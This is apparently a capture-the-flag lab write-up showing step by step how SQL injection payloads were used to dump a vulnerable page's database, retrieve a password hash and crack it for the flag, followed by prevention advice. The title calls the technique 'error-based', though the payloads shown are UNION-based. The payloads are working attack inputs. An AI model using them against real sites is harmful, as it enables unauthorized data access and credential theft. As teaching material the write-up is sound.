# Exploiting Error-Based SQL Injection Vulnerability

Introduction
This tutorial details how to exploit an error-based SQL injection vulnerability in a web application. This technique leverages SQL error messages to extract information from the database.

Prerequisites
- Basic understanding of SQL
- Access to the vulnerable web application
- A web browser
- Optional: A tool like Burp Suite to facilitate testing

Step 1: Identifying the Vulnerability

1. Access the vulnerable page:
```
http://[address]/index.php?page=member
```

2. Test for SQL errors by inserting special characters like a single quote (') in parameters.
If you see SQL error messages, the page is likely vulnerable.

Step 2: Determining Column Count

1. Use the ORDER BY clause to determine the number of columns:
```sql
1 order by 1  -- Works
1 order by 2  -- Works
1 order by 3  -- Error
```
The error on "order by 3" indicates the query uses 2 columns.

Step 3: Gathering Database Information

1. Retrieve the database name:
```sql
1 union all select 1,database()
```
Result: "Member_Sql_Injection"

2. Check MySQL version:
```sql
1 union all select 1,version()
```
Result: "5.5.44-0ubuntu0.12.04.1"

Step 4: Exploring the Structure

1. Identify tables:
```sql
1 union all select 1,group_concat(table_name) 
from Information_schema.tables 
where table_schema=database()
```
Result: table "users"

2. Retrieve column names:
```sql
1 union all select 1,group_concat(column_name) 
from Information_schema.columns 
where table_name=0x7573657273
```
Note: 0x7573657273 is "users" in hexadecimal

Result: "user_id,first_name,last_name,town,country,planet,Commentaire,countersign"

Step 5: Data Extraction

1. Read the comment:
```sql
1 union all select 1,group_concat(Commentaire,0x0a) 
from users
```
Result: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

2. Retrieve the encrypted password:
```sql
1 union all select 1,group_concat(countersign,0x0a) 
from users
```
Result: "5ff9d0165b4f92b14994e5c685cdce28"

Step 6: Decryption and Finalization

1. Decrypt the MD5 hash (use a service like md5decrypt.net)
Result: "FortyTwo"

2. Convert to lowercase:
"fortytwo"

3. Generate SHA256 hash:
```bash
echo -n fortytwo | shasum -a 256
```
Final flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Protection and Prevention

To protect an application against SQL injections:

1. Use prepared statements:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$userId]);
```

2. Escape user inputs:
```php
$safeInput = mysqli_real_escape_string($connection, $userInput);
```

3. Implement strict input validation:
```php
if (!preg_match("/^[0-9]+$/", $userInput)) {
    die("Invalid input");
}
```

4. Configure error messages properly:
In php.ini:
```
display_errors = Off
log_errors = On
```

Additional Security Measures:

1. Database Security
- Use principle of least privilege for database users
- Regularly update database software
- Enable SSL/TLS for database connections

2. Application Security
- Implement WAF (Web Application Firewall)
- Use HTTPS throughout the application
- Implement proper session management
- Regular security audits and penetration testing

3. Monitoring and Logging
- Implement comprehensive logging
- Monitor for suspicious database activity
- Set up alerts for potential SQL injection attempts

Conclusion

This vulnerability emphasizes the importance of secure handling of user inputs and proper error message configuration. Developers must always use prepared statements and implement rigorous input validation to prevent SQL injections. Regular security audits and staying updated with security best practices are essential for maintaining a secure application.